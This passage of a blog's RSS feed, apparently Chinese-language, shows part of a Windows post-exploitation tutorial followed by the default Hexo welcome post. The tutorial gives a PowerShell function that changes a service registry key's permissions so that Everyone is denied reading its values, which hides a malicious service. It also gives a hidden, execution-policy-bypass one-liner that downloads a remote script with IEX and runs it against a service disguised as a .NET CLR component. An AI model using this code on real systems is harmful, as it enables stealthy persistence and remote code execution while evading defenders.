&lt;p&gt;&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Server-Sddl-Change&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;type&#34;&gt;CmdletBinding&lt;/span&gt;()]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;param&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;type&#34;&gt;parameter&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;Mandatory&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$false&lt;/span&gt;)][&lt;span class=&#34;built_in&#34;&gt;String&lt;/span&gt;]&lt;span class=&#34;variable&#34;&gt;$Name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$ROOT&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;HKLM:\SYSTEM\CurrentControlSet\Services\&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$S&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$ROOT&lt;/span&gt;+&lt;span class=&#34;variable&#34;&gt;$NAME&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$acl&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;Get-Acl&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$acl&lt;/span&gt;.SetAccessRuleProtection(&lt;span class=&#34;variable&#34;&gt;$true&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$false&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$person&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.Principal.NTAccount&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;Everyone&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$access&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.RegistryRights&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;QueryValues&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$inheritance&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.InheritanceFlags&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;None&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$propagation&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.PropagationFlags&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;None&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$type&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.AccessControlType&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;Deny&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$rule&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;New-Object&lt;/span&gt; System.Security.AccessControl.RegistryAccessRule( `&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$person&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$access&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$inheritance&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$propagation&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$type&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$acl&lt;/span&gt;.AddAccessRule(&lt;span class=&#34;variable&#34;&gt;$rule&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$person&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.Principal.NTAccount&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;Everyone&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$access&lt;/span&gt; =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.RegistryRights&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;SetValue,CreateSubKey,EnumerateSu&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;bKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,Chang&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;ePermissions,TakeOwnership&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$inheritance&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.InheritanceFlags&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;None&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$propagation&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.PropagationFlags&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;None&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$type&lt;/span&gt; = [&lt;span class=&#34;type&#34;&gt;System.Security.AccessControl.AccessControlType&lt;/span&gt;]&lt;span class=&#34;string&#34;&gt;&amp;quot;Allow&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$rule&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;New-Object&lt;/span&gt; System.Security.AccessControl.RegistryAccessRule( `&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$person&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$access&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$inheritance&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$propagation&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$type&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$acl&lt;/span&gt;.AddAccessRule(&lt;span class=&#34;variable&#34;&gt;$rule&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;Set-Acl&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$S&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$acl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;7-远程加载powershell脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7-远程加载powershell脚本&#34;&gt;#&lt;/a&gt; 7. 远程加载 powershell 脚本：&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;powershell.exe &lt;span class=&#34;literal&#34;&gt;-exec&lt;/span&gt; bypass &lt;span class=&#34;literal&#34;&gt;-nop&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-w&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;hidden&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;IEX((new-object&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;net.webclient).downloadstring(&amp;#x27;http://192.168.0.149/1.ps1&amp;#x27;));Server-Sddl-Change -&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Name &amp;#x27;.NET CLR Networking 3.5.0.0&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏&#34;&gt;#&lt;/a&gt; 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973492501-06b273bb-dd0f-4db0-bc84-0af6838061a7.png#averageHue=%23fbfaf9&amp;amp;clientId=ua1aa948f-0eae-4&amp;amp;from=paste&amp;amp;height=259&amp;amp;id=ua87b4a87&amp;amp;originHeight=259&amp;amp;originWidth=926&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=61070&amp;amp;status=done&amp;amp;style=none&amp;amp;taskId=u375f7037-0514-4820-aa72-7d5fd3ea1d0&amp;amp;title=&amp;amp;width=926&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/01/22/life/hello-world/</guid>
            <title>你好</title>
            <link>http://example.com/2024/01/22/life/hello-world/</link>
            <category>我的博客</category>
            <pubDate>Mon, 22 Jan 2024 00:30:34 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
